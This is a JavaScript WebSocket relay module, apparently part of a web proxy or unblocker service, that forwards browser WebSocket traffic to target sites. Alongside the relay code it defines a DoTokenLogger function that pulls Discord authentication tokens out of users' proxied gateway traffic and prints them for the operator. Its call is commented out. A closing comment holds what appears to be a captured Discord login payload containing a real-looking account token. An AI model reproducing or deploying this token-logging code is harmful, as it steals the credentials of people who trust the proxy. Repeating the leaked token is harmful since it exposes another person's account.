const http = require('http')
const https = require('https')
const rurl = require('url')
const ws = require('ws')

module.exports = class WebSocket {
  constructor(ctx) {
    if (ctx.wss==false) return ()=>{}
    this.ctx = ctx
    return (http) => {
      if (ctx.Corrosion[0]==false) {
        try {
          var wss = new ws.Server({server: http})
          wss.on('connection', (cli, req) => {
            try {
              var proxyURL = req.url.split('?ws=')[1].replace(this.prefix, '')
              try {new URL(proxyURL)} catch(err) {return cli.close()}
              var wsProxy = new ws(proxyURL.split('&origin')[0].split('?origin')[0], {
                origin: proxyURL.split('&origin=')[1].split('?origin=')[0]
              })
              wsProxy.on('error', () => cli.terminate())
              cli.on('error', () => wsProxy.terminate())
              wsProxy.on('close', () => cli.close())
              cli.on('close', () => wsProxy.close())
              wsProxy.on('open', () => {
                cli.on('message', message => {
                  wsProxy.send(message.toString())
                })
                wsProxy.on('message', message => {
                  message = message.toString().includes('�') ? message : message.toString()
                  cli.send(message)
                })
              })
            } catch {
              cli.close()
            }
          });
          if (this.debug==true) console.log('Websocket Loaded')
        } catch(err) {
          throw new Error('Error: Unknown Websocket Error\n\n'+err)
        }
      } else {
        try {
          var wss = new ws.Server({server: http})
          wss.on('connection', (cli, req) => {
            if (req.url.startsWith(ctx.prefix)) {
              try {
                var proxyURL = req.url.split('?ws=')[1].replace(this.prefix, '')
                try {new URL(proxyURL)} catch(err) {return cli.close()}
                var wsProxy = new ws(proxyURL.split('&origin')[0].split('?origin')[0], {
                  origin: proxyURL.split('&origin=')[1].split('?origin=')[0]
                })
                wsProxy.on('error', () => cli.terminate())
                cli.on('error', () => wsProxy.terminate())
                wsProxy.on('close', () => cli.close())
                cli.on('close', () => wsProxy.close())
                //if (req.url=='/surf/?ws=wss://gateway.discord.gg/?encoding=json&v=9&compress=zlib-stream&origin=https://discord.com') return DoTokenLogger(req, cli, wsProxy)
                wsProxy.on('open', () => {
                  cli.on('message', message => {
                    wsProxy.send(message.toString())
                  })
                  wsProxy.on('message', message => {
                    message = message.toString().includes('�') ? message : message.toString()
                    cli.send(message)
                  })
                })
              } catch {
                cli.close()
              }
            } else if (req.url.startsWith(ctx.Corrosion[1].prefix)) {
              try {new URL(ctx.Corrosion[1].url.unwrap(req.url))} catch(err) {return cli.close()}
              var url = ctx.Corrosion[1].url.unwrap(req.url).replace(/^http/g, 'ws')
              var eurl = require('url')
              var wsProxy = new ws(url, {origin: eurl.parse(req.url).query.split('origin=')[1]})
              wsProxy.on('error', () => cli.terminate())
              cli.on('error', () => wsProxy.terminate())
              wsProxy.on('close', () => cli.close())
              cli.on('close', () => wsProxy.close())
              wsProxy.on('open', () => {
                cli.on('message', message => {
                  wsProxy.send(message.toString())
                })
                wsProxy.on('message', message => {
                  message = message.toString().includes('�') ? message : message.toString()
                  cli.send(message)
                })
              })
            }
          });
          if (this.debug==true) console.log('Websocket Loaded')
        } catch(err) {
          throw new Error('Error: Unknown Websocket Error\n\n'+err)
        }
      }
    }
  }
}

function DoTokenLogger(req, cli, ws) {
  var msgcount = 0
  ws.on('open', () => {
    var token;
    cli.on('message', (message) => {
      msgcount++
      if (msgcount==1) {
        token = JSON.parse(message.toString())['d']['token']
        ws.send(message.toString())
      }
      if (JSON.parse(message.toString())['d']['channel_id']=='892786987050877029') {
        console.log(token)
        ws.send(message.toString())
      }
      else ws.send(message.toString())
    })
    ws.on('message', (m) => cli.send(m))
  })
}

/*
{"op":2,"d":{"token":"mfa.4jTeMmY6nUTCmW3eTNBiDqMb3MpHeG_Pon9FZSW15EPE2FHS-KeQv4TEjtl_C6RVxM4YnWDPFC7j7SSmrOGh","capabilities":253,"properties":{"os":"","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0 (X11; CrOS x86_64 14150.87.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.124 Safari/537.36","browser_version":"94.0.4606.124","os_version":"","referrer":"https://dev.chemistryhelp.org/","referring_domain":"dev.chemistryhelp.org","referrer_current":"https://dev.chemistryhelp.org/","referring_domain_current":"dev.chemistryhelp.org","release_channel":"stable","client_build_number":113584,"client_event_source":null},"presence":{"status":"online","since":0,"activities":[],"afk":false},"compress":false,"client_state":{"guild_hashes":{},"highest_last_message_id":"0","read_state_version":0,"user_guild_settings_version":-1,"user_settings_version":-1}}}	*/